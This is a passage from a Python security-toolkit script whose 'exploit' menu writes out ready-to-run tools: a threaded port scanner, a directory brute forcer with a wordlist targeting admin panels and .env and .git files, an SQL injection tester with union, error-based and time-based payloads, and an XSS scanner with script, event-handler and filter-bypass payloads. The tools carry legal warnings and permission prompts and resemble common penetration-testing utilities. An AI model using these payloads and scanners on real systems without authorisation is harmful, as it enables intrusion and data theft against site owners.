    save_result("encrypt.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 8: EXPLOIT LOCAL ==================
def fitur_8():  
    os.system('clear'); print(colored("\n[8] EXPLOIT & SECURITY TOOLS", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Security Testing Tools]", 'yellow'))
    
    print(colored("\nSelect security tool:", 'cyan'))
    print(colored("   1. Port Scanner", 'white'))
    print(colored("   2. Directory Brute Forcer", 'white'))
    print(colored("   3. SQL Injection Tester", 'white'))
    print(colored("   4. XSS Vulnerability Scanner", 'white'))
    print(colored("   5. WiFi Password Viewer (Windows)", 'white'))
    
    choice = input(colored("\nSelect [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        print(colored("\n[Port Scanner Tool]", 'yellow'))
        
        port_scanner = '''#!/usr/bin/env python3
import socket, threading, time, sys, ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed

print("[PORT SCANNER TOOL]")

def scan_port(host, port, timeout=1):
    """Scan a single port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        result = sock.connect_ex((host, port))
        
        if result == 0:
            # Port is open
            try:
                # Try to get banner
                sock.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    # Extract first line or service info
                    lines = banner.split('\\n')
                    if lines:
                        banner = lines[0][:50]
                else:
                    banner = "No banner"
            except:
                banner = "No banner"
            
            sock.close()
            return port, True, banner
        else:
            sock.close()
            return port, False, None
    
    except socket.timeout:
        return port, False, None
    except Exception as e:
        return port, False, None

def scan_ports(host, ports, max_threads=100):
    """Scan multiple ports"""
    print(f"\\nScanning {host}...")
    print(f"Ports to scan: {len(ports)}")
    print(f"Threads: {max_threads}")
    print()
    
    open_ports = []
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        
        completed = 0
        for future in as_completed(futures):
            completed += 1
            port, is_open, banner = future.result()
            
            if is_open:
                open_ports.append((port, banner))
                print(f"[+] Port {port}/TCP open - {banner}")
            
            # Progress display
            if completed % 50 == 0:
                print(f"   Progress: {completed}/{len(ports)} ports scanned")
    
    return open_ports

def common_ports():
    """Return common ports to scan"""
    return [
        # Common services
        21,    # FTP
        22,    # SSH
        23,    # Telnet
        25,    # SMTP
        53,    # DNS
        80,    # HTTP
        110,   # POP3
        111,   # RPC
        135,   # MS RPC
        139,   # NetBIOS
        143,   # IMAP
        443,   # HTTPS
        445,   # SMB
        993,   # IMAPS
        995,   # POP3S
        1433,  # MSSQL
        1521,  # Oracle
        1723,  # PPTP
        2049,  # NFS
        3306,  # MySQL
        3389,  # RDP
        5432,  # PostgreSQL
        5900,  # VNC
        6379,  # Redis
        8080,  # HTTP Proxy
        8443,  # HTTPS Alt
        9000,  # PHP-FPM
        27017, # MongoDB
    ]

def service_name(port):
    """Get service name for port"""
    services = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        5900: "VNC",
        8080: "HTTP-Proxy",
    }
    return services.get(port, "Unknown")

def main():
    print("\\nPORT SCANNER")
    print("=" * 50)
    
    # Get target
    target = input("Target IP/hostname: ").strip()
    if not target:
        print("Target required!")
        return
    
    # Validate target
    try:
        # Check if it's a hostname
        try:
            ip = socket.gethostbyname(target)
        except:
            ip = target
        
        # Validate IP
        ipaddress.ip_address(ip)
        print(f"Target IP: {ip}")
    except:
        print("Invalid IP/hostname!")
        return
    
    # Port selection
    print("\\nPort selection:")
    print("  1. Common ports (35 ports)")
    print("  2. Top 1000 ports")
    print("  3. All ports (1-65535)")
    print("  4. Custom range")
    print("  5. Specific ports")
    
    port_choice = input("Choose [1-5]: ").strip()
    
    if port_choice == "1":
        ports = common_ports()
    elif port_choice == "2":
        # Common 1000 ports
        ports = list(range(1, 1001))
    elif port_choice == "3":
        ports = list(range(1, 65536))
    elif port_choice == "4":
        try:
            start = int(input("Start port: ").strip())
            end = int(input("End port: ").strip())
            if start < 1 or end > 65535 or start > end:
                print("Invalid range!")
                return
            ports = list(range(start, end + 1))
        except:
            print("Invalid input!")
            return
    elif port_choice == "5":
        port_input = input("Ports (comma separated, e.g., 80,443,8080): ").strip()
        try:
            ports = [int(p.strip()) for p in port_input.split(',')]
        except:
            print("Invalid port list!")
            return
    else:
        print("Invalid choice!")
        return
    
    # Thread count
    try:
        threads = int(input("Threads (default 100, max 500): ").strip() or "100")
        if threads < 1:
            threads = 1
        if threads > 500:
            threads = 500
            print("Capped at 500 threads")
    except:
        threads = 100
    
    # Timeout
    try:
        timeout = float(input("Timeout per port (seconds, default 1): ").strip() or "1")
        if timeout < 0.1:
            timeout = 0.1
        if timeout > 10:
            timeout = 10
    except:
        timeout = 1
    
    # Legal warning
    print("\\n[!] LEGAL WARNING:")
    print("    • Only scan systems you own or have permission to scan")
    print("    • Unauthorized scanning is illegal")
    print("    • Continue only if you have authorization")
    
    confirm = input("\\nDo you have permission to scan this target? (y/n): ").lower()
    if confirm != 'y':
        print("Scan cancelled.")
        return
    
    # Start scan
    start_time = time.time()
    
    try:
        open_ports = scan_ports(ip, ports, threads)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Results
        print(f"\\n{'='*50}")
        print(f"SCAN RESULTS")
        print(f"{'='*50}")
        print(f"Target: {target} ({ip})")
        print(f"Scan duration: {duration:.2f} seconds")
        print(f"Ports scanned: {len(ports)}")
        print(f"Open ports found: {len(open_ports)}")
        
        if open_ports:
            print(f"\\nOPEN PORTS:")
            for port, banner in open_ports:
                service = service_name(port)
                print(f"  {port}/TCP - {service}")
                if banner and banner != "No banner":
                    print(f"      Banner: {banner}")
        
        # Save results
        save = input("\\nSave results to file? (y/n): ").lower()
        if save == 'y':
            filename = f"port_scan_{ip}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"Port Scan Results\\n")
                f.write(f"{'='*50}\\n")
                f.write(f"Target: {target} ({ip})\\n")
                f.write(f"Time: {time.ctime()}\\n")
                f.write(f"Duration: {duration:.2f} seconds\\n")
                f.write(f"Ports scanned: {len(ports)}\\n")
                f.write(f"Open ports: {len(open_ports)}\\n\\n")
                
                if open_ports:
                    f.write("OPEN PORTS:\\n")
                    for port, banner in open_ports:
                        service = service_name(port)
                        f.write(f"  {port}/TCP - {service}\\n")
                        if banner and banner != "No banner":
                            f.write(f"      Banner: {banner}\\n")
            
            print(f"Results saved to {filename}")
    
    except KeyboardInterrupt:
        print("\\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\\n[!] Error: {e}")

if __name__ == "__main__":
    main()
'''
        
        filename = "port_scanner.py"
        with open(filename, "w") as f:
            f.write(port_scanner)
        
        print(colored(f"\n[Port Scanner Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Scans for open ports on target", 'white'))
        print(colored(f"   Multi-threaded, fast scanning", 'yellow'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
        print(colored("   WARNING: Only scan authorized targets!", 'red'))
    
    elif choice == "2":
        print(colored("\n[Directory Brute Forcer]", 'yellow'))
        
        dir_brute = '''#!/usr/bin/env python3
import requests, threading, queue, sys, time, os
from urllib.parse import urljoin

print("[DIRECTORY BRUTE FORCER]")

def load_wordlist(wordlist_path):
    """Load wordlist from file"""
    if not os.path.exists(wordlist_path):
        print(f"Error: Wordlist not found: {wordlist_path}")
        return []
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
        return words
    except Exception as e:
        print(f"Error loading wordlist: {e}")
        return []

def check_directory(url, directory, timeout=5):
    """Check if directory exists"""
    full_url = urljoin(url, directory)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        response = requests.get(full_url, headers=headers, timeout=timeout, allow_redirects=False)
        
        # Check status code
        if response.status_code == 200:
            return full_url, response.status_code, len(response.content)
        elif response.status_code in [301, 302, 307, 308]:
            return full_url, response.status_code, "REDIRECT"
        elif response.status_code == 403:
            return full_url, response.status_code, "FORBIDDEN"
        elif response.status_code == 401:
            return full_url, response.status_code, "UNAUTHORIZED"
        else:
            return None
    
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except Exception as e:
        return None

def worker(url, word_queue, results, timeout, delay):
    """Worker thread for brute forcing"""
    while not word_queue.empty():
        try:
            directory = word_queue.get_nowait()
            
            result = check_directory(url, directory, timeout)
            if result:
                results.append(result)
                full_url, status, info = result
                
                if status == 200:
                    print(f"[+] Found: {full_url} (200) - Size: {info}")
                elif status in [301, 302, 307, 308]:
                    print(f"[+] Found: {full_url} ({status}) - Redirect")
                elif status == 403:
                    print(f"[!] Found: {full_url} (403) - Forbidden")
                elif status == 401:
                    print(f"[!] Found: {full_url} (401) - Unauthorized")
            
            # Delay between requests
            if delay > 0:
                time.sleep(delay)
            
            word_queue.task_done()
            
        except queue.Empty:
            break
        except Exception as e:
            continue

def main():
    print("\\nDIRECTORY BRUTE FORCER")
    print("=" * 50)
    
    # Get target URL
    url = input("Target URL (e.g., http://example.com/): ").strip()
    if not url:
        print("URL required!")
        return
    
    # Ensure URL ends with /
    if not url.endswith('/'):
        url += '/'
    
    # Wordlist selection
    print("\\nWordlist options:")
    print("  1. Use built-in common directories")
    print("  2. Use custom wordlist file")
    
    wordlist_choice = input("Choose [1-2]: ").strip()
    
    if wordlist_choice == "1":
        # Common directories
        directories = [
            "admin", "administrator", "login", "panel", "wp-admin", "dashboard",
            "backend", "adminpanel", "control", "manager", "system", "config",
            "phpmyadmin", "mysql", "database", "db", "sql", "backup", "backups",
            "old", "test", "testing", "dev", "development", "stage", "staging",
            "api", "rest", "graphql", "oauth", "auth", "authentication",
            "user", "users", "account", "accounts", "profile", "profiles",
            "upload", "uploads", "files", "documents", "images", "media",
            "download", "downloads", "static", "assets", "css", "js", "img",
            "include", "includes", "templates", "themes", "plugins", "modules",
            "vendor", "vendors", "lib", "libs", "library", "libraries",
            "src", "source", "sources", "bin", "scripts", "tools", "utils",
            "tmp", "temp", "temporary", "cache", "cached", "session", "sessions",
            "logs", "log", "error", "errors", "debug", "status", "health",
            "info", "information", "about", "contact", "help", "support",
            "faq", "forum", "forums", "blog", "news", "articles", "posts",
            "shop", "store", "cart", "checkout", "payment", "payments",
            "secure", "security", "private", "protected", "hidden", "secret",
            ".git", ".svn", ".env", "config.php", "wp-config.php", "robots.txt",
            "sitemap.xml", "crossdomain.xml", "phpinfo.php", "info.php",
            "server-status", "server-info", ".htaccess", ".htpasswd",
            "LICENSE", "README", "CHANGELOG", "CONTRIBUTING",
        ]
        
        print(f"Using built-in wordlist ({len(directories)} directories)")
    
    elif wordlist_choice == "2":
        wordlist_path = input("Wordlist file path: ").strip()
        if not os.path.exists(wordlist_path):
            print("Wordlist file not found!")
            return
        
        directories = load_wordlist(wordlist_path)
        if not directories:
            print("Wordlist is empty!")
            return
        
        print(f"Loaded {len(directories)} directories from wordlist")
    
    else:
        print("Invalid choice!")
        return
    
    # Thread count
    try:
        threads = int(input("Threads (default 10, max 50): ").strip() or "10")
        if threads < 1:
            threads = 1
        if threads > 50:
            threads = 50
            print("Capped at 50 threads")
    except:
        threads = 10
    
    # Timeout
    try:
        timeout = int(input("Timeout per request (seconds, default 5): ").strip() or "5")
        if timeout < 1:
            timeout = 1
        if timeout > 30:
            timeout = 30
    except:
        timeout = 5
    
    # Delay between requests
    try:
        delay = float(input("Delay between requests (seconds, default 0): ").strip() or "0")
        if delay < 0:
            delay = 0
        if delay > 5:
            delay = 5
    except:
        delay = 0
    
    # Check target first
    print(f"\\nChecking target: {url}")
    try:
        response = requests.get(url, timeout=10)
        print(f"Target responded with status: {response.status_code}")
    except:
        print("Warning: Target may not be reachable")
    
    # Legal warning
    print("\\n[!] LEGAL WARNING:")
    print("    • Only test systems you own or have permission to test")
    print("    • Unauthorized testing is illegal")
    print("    • Continue only if you have authorization")
    
    confirm = input("\\nDo you have permission to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Test cancelled.")
        return
    
    # Start brute force
    print(f"\\nStarting directory brute force...")
    print(f"Target: {url}")
    print(f"Directories to check: {len(directories)}")
    print(f"Threads: {threads}")
    print(f"Delay: {delay}s between requests")
    print()
    
    start_time = time.time()
    
    # Create queue
    word_queue = queue.Queue()
    for directory in directories:
        word_queue.put(directory)
    
    # Results list
    results = []
    
    # Create and start threads
    thread_list = []
    for i in range(threads):
        thread = threading.Thread(
            target=worker,
            args=(url, word_queue, results, timeout, delay)
        )
        thread.daemon = True
        thread.start()
        thread_list.append(thread)
    
    # Wait for all threads to complete
    try:
        for thread in thread_list:
            thread.join()
    except KeyboardInterrupt:
        print("\\n[!] Brute force interrupted by user")
    
    end_time = time.time()
    duration = end_time - start_time
    
    # Results summary
    print(f"\\n{'='*50}")
    print(f"BRUTE FORCE RESULTS")
    print(f"{'='*50}")
    print(f"Target: {url}")
    print(f"Time: {time.ctime()}")
    print(f"Duration: {duration:.2f} seconds")
    print(f"Directories checked: {len(directories)}")
    print(f"Found: {len(results)} interesting responses")
    
    if results:
        print(f"\\nFOUND DIRECTORIES:")
        
        # Group by status code
        found_200 = [r for r in results if r[1] == 200]
        found_redirect = [r for r in results if r[1] in [301, 302, 307, 308]]
        found_403 = [r for r in results if r[1] == 403]
        found_401 = [r for r in results if r[1] == 401]
        
        if found_200:
            print(f"\\n  [200 OK]:")
            for url, status, size in found_200:
                print(f"    {url} (Size: {size} bytes)")
        
        if found_redirect:
            print(f"\\n  [REDIRECTS]:")
            for url, status, _ in found_redirect:
                print(f"    {url} (Status: {status})")
        
        if found_403:
            print(f"\\n  [403 FORBIDDEN]:")
            for url, status, _ in found_403:
                print(f"    {url}")
        
        if found_401:
            print(f"\\n  [401 UNAUTHORIZED]:")
            for url, status, _ in found_401:
                print(f"    {url}")
    
    # Save results
    save = input("\\nSave results to file? (y/n): ").lower()
    if save == 'y':
        filename = f"dir_scan_{url.replace('://', '_').replace('/', '_')}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Directory Brute Force Results\\n")
            f.write(f"{'='*50}\\n")
            f.write(f"Target: {url}\\n")
            f.write(f"Time: {time.ctime()}\\n")
            f.write(f"Duration: {duration:.2f} seconds\\n")
            f.write(f"Directories checked: {len(directories)}\\n")
            f.write(f"Found: {len(results)} interesting responses\\n\\n")
            
            if results:
                f.write("FOUND DIRECTORIES:\\n")
                
                for url, status, info in results:
                    if status == 200:
                        f.write(f"[200] {url} - Size: {info} bytes\\n")
                    elif status in [301, 302, 307, 308]:
                        f.write(f"[{status}] {url} - Redirect\\n")
                    elif status == 403:
                        f.write(f"[403] {url} - Forbidden\\n")
                    elif status == 401:
                        f.write(f"[401] {url} - Unauthorized\\n")
        
        print(f"Results saved to {filename}")

if __name__ == "__main__":
    main()
'''
        
        filename = "dir_bruteforcer.py"
        with open(filename, "w") as f:
            f.write(dir_brute)
        
        print(colored(f"\n[Directory Brute Forcer Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Finds hidden directories on websites", 'white'))
        print(colored(f"   Multi-threaded with delay option", 'yellow'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
        print(colored("   WARNING: Only test authorized websites!", 'red'))
    
    elif choice == "3":
        print(colored("\n[SQL Injection Tester]", 'yellow'))
        
        sql_tester = '''#!/usr/bin/env python3
import requests, sys, time, urllib.parse
from bs4 import BeautifulSoup

print("[SQL INJECTION TESTER]")

def test_sql_injection(url, param, payloads):
    """Test for SQL injection vulnerability"""
    results = []
    
    for payload in payloads:
        # Prepare test data
        test_value = urllib.parse.quote(payload)
        
        # Test GET parameter
        if '?' in url:
            # Replace parameter value
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            if param in query_params:
                # Create new URL with payload
                query_params[param] = [test_value]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
            else:
                # Add parameter
                separator = '&' if '&' in parsed.query else '?'
                if '=' in parsed.query:
                    test_url = f"{url}{separator}{param}={test_value}"
                else:
                    test_url = f"{url}?{param}={test_value}"
        else:
            # Add parameter to URL
            separator = '?' if '?' not in url else '&'
            test_url = f"{url}{separator}{param}={test_value}"
        
        # Send request
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        try:
            response = requests.get(test_url, headers=headers, timeout=10)
            
            # Check for SQL error messages
            error_indicators = [
                'sql', 'SQL', 'mysql', 'MySQL', 'oracle', 'Oracle',
                'syntax', 'Syntax', 'error', 'Error', 'exception', 'Exception',
                'warning', 'Warning', 'undefined', 'Undefined',
                'mysql_fetch', 'mysqli_fetch', 'pg_fetch',
                'unclosed', 'Unclosed', 'quotation', 'Quotation',
                'near', 'Near', 'at line', 'You have an error',
                'supplied argument', 'division by zero'
            ]
            
            page_content = response.text.lower()
            
            for indicator in error_indicators:
                if indicator.lower() in page_content:
                    results.append({
                        'payload': payload,
                        'url': test_url,
                        'status': response.status_code,
                        'error': indicator,
                        'vulnerable': True
                    })
                    print(f"[!] Potential SQLi: {payload}")
                    break
            else:
                # Check for time-based blind SQLi
                if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                    start_time = time.time()
                    try:
                        requests.get(test_url, headers=headers, timeout=30)
                    except requests.exceptions.Timeout:
                        pass
                    end_time = time.time()
                    
                    if end_time - start_time > 5:
                        results.append({
                            'payload': payload,
                            'url': test_url,
                            'status': 'TIMEOUT',
                            'error': 'Time-based delay detected',
                            'vulnerable': True
                        })
                        print(f"[!] Potential Blind SQLi (Time-based): {payload}")
        
        except requests.exceptions.Timeout:
            # Timeout might indicate successful time-based injection
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                results.append({
                    'payload': payload,
                    'url': test_url,
                    'status': 'TIMEOUT',
                    'error': 'Request timeout (possible blind SQLi)',
                    'vulnerable': True
                })
                print(f"[!] Potential Blind SQLi (Timeout): {payload}")
        
        except Exception as e:
            pass
        
        # Delay to avoid rate limiting
        time.sleep(0.5)
    
    return results

def get_sql_payloads():
    """Get SQL injection test payloads"""
    payloads = [
        # Basic injection tests
        "'",
        "''",
        "`",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1/*",
        
        # Union-based
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT version(),user(),database() --",
        
        # Error-based
        "' AND 1=CONVERT(int, @@version) --",
        "' AND 1=1 --",
        "' AND 1=2 --",
        
        # Blind boolean
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND SLEEP(5) --",
        "' AND IF(1=1,SLEEP(5),0) --",
        
        # Time-based
        "' OR SLEEP(5) --",
        "' OR IF(1=1,SLEEP(5),0) --",
        "' OR BENCHMARK(10000000,MD5('test')) --",
        
        # MSSQL
        "' OR '1'='1'; WAITFOR DELAY '00:00:05' --",
        
        # Oracle
        "' OR '1'='1' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=0 --",
        
        # PostgreSQL
        "' OR '1'='1' AND pg_sleep(5) --",
        
        # Second order
        "1' OR '1'='1",
        "admin' --",
        "admin' #",
        "admin' /*",
        
        # Bypass
        "' OR '1'='1' -- -",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        
        # Advanced
        "' UNION ALL SELECT NULL,NULL,NULL,NULL --",
        "' UNION ALL SELECT version(),NULL,NULL,NULL --",
        "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version()))) --",
    ]
    
    return payloads

def scan_url_for_parameters(url):
    """Scan URL for parameters"""
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    if query_params:
        return list(query_params.keys())
    else:
        # Try to guess common parameters
        common_params = [
            'id', 'page', 'view', 'file', 'cat', 'category',
            'product', 'item', 'user', 'username', 'email',
            'search', 'query', 'q', 's', 'keyword',
            'year', 'month', 'day', 'date',
            'order', 'sort', 'filter',
            'action', 'mode', 'type',
            'name', 'title', 'subject',
            'msg', 'message', 'text',
            'number', 'num', 'no',
            'limit', 'offset', 'start',
            'lang', 'language', 'locale',
            'country', 'state', 'city',
            'price', 'amount', 'cost',
            'color', 'size', 'weight',
            'ref', 'referer', 'source',
            'url', 'link', 'redirect',
            'token', 'key', 'auth',
            'session', 'sid', 'id_session',
            'admin', 'password', 'pass',
            'login', 'logout', 'register',
        ]
        return common_params

def main():
    print("\\nSQL INJECTION TESTER")
    print("=" * 50)
    
    # Get target URL
    url = input("Target URL (with parameters if any): ").strip()
    if not url:
        print("URL required!")
        return
    
    # Check if URL has parameters
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    parameters = []
    
    if query_params:
        print(f"\\nFound parameters in URL: {', '.join(query_params.keys())}")
        use_existing = input("Test these parameters? (y/n): ").lower()
        
        if use_existing == 'y':
            parameters = list(query_params.keys())
        else:
            # Manually specify parameters
            param_input = input("Parameters to test (comma separated): ").strip()
            if param_input:
                parameters = [p.strip() for p in param_input.split(',')]
    else:
        print("\\nNo parameters found in URL.")
        param_input = input("Parameters to test (comma separated): ").strip()
        if param_input:
            parameters = [p.strip() for p in param_input.split(',')]
    
    if not parameters:
        print("No parameters specified!")
        return
    
    # Get payloads
    print("\\nLoading SQL injection payloads...")
    payloads = get_sql_payloads()
    print(f"Loaded {len(payloads)} payloads")
    
    # Legal warning
    print("\\n[!] LEGAL WARNING:")
    print("    • Only test systems you own or have permission to test")
    print("    • SQL injection testing may damage databases")
    print("    • Unauthorized testing is illegal")
    print("    • Continue only if you have authorization")
    
    confirm = input("\\nDo you have permission to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Test cancelled.")
        return
    
    # Start testing
    print(f"\\nStarting SQL injection tests...")
    print(f"Target: {url}")
    print(f"Parameters: {', '.join(parameters)}")
    print(f"Payloads: {len(payloads)}")
    print()
    
    start_time = time.time()
    
    all_results = []
    
    for param in parameters:
        print(f"\\nTesting parameter: {param}")
        print("-" * 50)
        
        results = test_sql_injection(url, param, payloads)
        all_results.extend(results)
        
        if results:
            print(f"Found {len(results)} potential vulnerabilities for {param}")
        else:
            print(f"No vulnerabilities found for {param}")
    
    end_time = time.time()
    duration = end_time - start_time
    
    # Results summary
    print(f"\\n{'='*50}")
    print(f"SQL INJECTION TEST RESULTS")
    print(f"{'='*50}")
    print(f"Target: {url}")
    print(f"Time: {time.ctime()}")
    print(f"Duration: {duration:.2f} seconds")
    print(f"Parameters tested: {len(parameters)}")
    print(f"Payloads tested: {len(payloads)}")
    print(f"Potential vulnerabilities found: {len(all_results)}")
    
    if all_results:
        print(f"\\nVULNERABILITIES FOUND:")
        
        for result in all_results:
            print(f"\\n  Parameter: {result['url'].split('=')[0].split('&')[-1]}")
            print(f"  Payload: {result['payload']}")
            print(f"  URL: {result['url']}")
            print(f"  Indicator: {result['error']}")
    
    # Save results
    if all_results:
        save = input("\\nSave results to file? (y/n): ").lower()
        if save == 'y':
            filename = f"sqli_test_{parsed.netloc}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"SQL Injection Test Results\\n")
                f.write(f"{'='*50}\\n")
                f.write(f"Target: {url}\\n")
                f.write(f"Time: {time.ctime()}\\n")
                f.write(f"Duration: {duration:.2f} seconds\\n")
                f.write(f"Parameters tested: {len(parameters)}\\n")
                f.write(f"Payloads tested: {len(payloads)}\\n")
                f.write(f"Vulnerabilities found: {len(all_results)}\\n\\n")
                
                f.write("VULNERABILITIES:\\n")
                for result in all_results:
                    f.write(f"\\nParameter: {result['url'].split('=')[0].split('&')[-1]}\\n")
                    f.write(f"Payload: {result['payload']}\\n")
                    f.write(f"URL: {result['url']}\\n")
                    f.write(f"Indicator: {result['error']}\\n")
                    f.write(f"{'-'*30}\\n")
            
            print(f"Results saved to {filename}")
    
    # Recommendations
    print(f"\\n{'='*50}")
    print(f"RECOMMENDATIONS")
    print(f"{'='*50}")
    print("If vulnerabilities were found:")
    print("  1. Use parameterized queries or prepared statements")
    print("  2. Implement input validation and sanitization")
    print("  3. Use stored procedures")
    print("  4. Apply the principle of least privilege")
    print("  5. Use a Web Application Firewall (WAF)")
    print("  6. Regularly update and patch software")
    print("  7. Conduct regular security audits")

if __name__ == "__main__":
    main()
'''
        
        filename = "sql_injection_tester.py"
        with open(filename, "w") as f:
            f.write(sql_tester)
        
        print(colored(f"\n[SQL Injection Tester Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Tests for SQL injection vulnerabilities", 'white'))
        print(colored(f"   Includes various payload types", 'yellow'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
        print(colored("   WARNING: Only test authorized targets!", 'red'))
        print(colored("   May damage databases if vulnerable", 'red'))
    
    elif choice == "4":
        print(colored("\n[XSS Vulnerability Scanner]", 'yellow'))
        
        xss_scanner = '''#!/usr/bin/env python3
import requests, sys, time, urllib.parse, json, re
from bs4 import BeautifulSoup

print("[XSS VULNERABILITY SCANNER]")

def get_xss_payloads():
    """Get XSS test payloads"""
    payloads = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(window.location)</script>",
        
        # Without script tags
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "></script><script>alert('XSS')</script>",
        
        # Event handlers
        "\" onmouseover=\"alert('XSS')\"",
        "' onmouseover=\"alert('XSS')\"",
        " onload=\"alert('XSS')\"",
        " onerror=\"alert('XSS')\"",
        
        # JavaScript URIs
        "javascript:alert('XSS')",
        "JaVaScRiPt:alert('XSS')",
        "javascript:alert(document.cookie)",
        
        # IMG tags
        "<img src=x onerror=alert('XSS')>",
        "<img src=\"javascript:alert('XSS')\">",
        "<img src=x onerror=alert(document.domain)>",
        
        # SVG tags
        "<svg onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
        
        # Body tags
        "<body onload=alert('XSS')>",
        
        # Input tags
        "<input onfocus=alert('XSS') autofocus>",
        
        # Iframe tags
        "<iframe onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
        
        # Form tags
        "<form action=\"javascript:alert('XSS')\"><input type=submit>",
        
        # Anchor tags
        "<a href=\"javascript:alert('XSS')\">Click</a>",
        
        # CSS
        "<style>@import 'javascript:alert(\"XSS\")';</style>",
        "<div style=\"background-image: url(javascript:alert('XSS'))\">",
        
        # Encoded
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        
        # Unicode
        "＜script＞alert('XSS')＜/script＞",
        
        # Bypass filters
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<scri<script>pt>alert('XSS')</scri</script>pt>",
        
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
    ]
    
    return payloads

def test_xss(url, param, payload):
    """Test for XSS vulnerability"""
    # Prepare test data
    test_value = urllib.parse.quote(payload)
    
    # Test GET parameter
    if '?' in url:
        # Replace parameter value
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        if param in query_params:
            # Create new URL with payload
            query_params[param] = [test_value]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
        else:
            # Add parameter
            separator = '&' if '&' in parsed.query else '?'
            if '=' in parsed.query:
                test_url = f"{url}{separator}{param}={test_value}"
            else:
                test_url = f"{url}?{param}={test_value}"
    else:
        # Add parameter to URL
        separator = '?' if '?' not in url else '&'
        test_url = f"{url}{separator}{param}={test_value}"
    
    # Send request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        response = requests.get(test_url, headers=headers, timeout=10)
        
        # Check if payload appears in response (reflected XSS)
        if payload in response.text:
            return {
                'payload': payload,
                'url': test_url,
                'status': response.status_code,
                'type': 'Reflected',
                'vulnerable': True
            }
        
        # Check for encoded payload
        encoded_payload = urllib.parse.unquote(test_value)
        if encoded_payload in response.text:
            return {
                'payload': payload,
                'url': test_url,
                'status': response.status_code,
                'type': 'Reflected (Encoded)',
                'vulnerable': True
            }
        
        # Check for partial matches (DOM-based XSS indicators)
        dom_indicators = [
            'innerHTML', 'outerHTML', 'write(', 'writeln(',
            'eval(', 'setTimeout(', 'setInterval(',
            'Function(', 'execScript(', 'document.url',
            'location.href', 'location.hash', 'location.search'
        ]
        
        for indicator in dom_indicators:
            if indicator in response.text:
                # Check if payload is near indicator
                content_lower = response.text.lower()
                payload_lower = payload.lower()
                
                if payload_lower in content_lower:
                    index = content_lower.find(payload_lower)
                    # Check context around payload
                    context_start = max(0, index - 100)
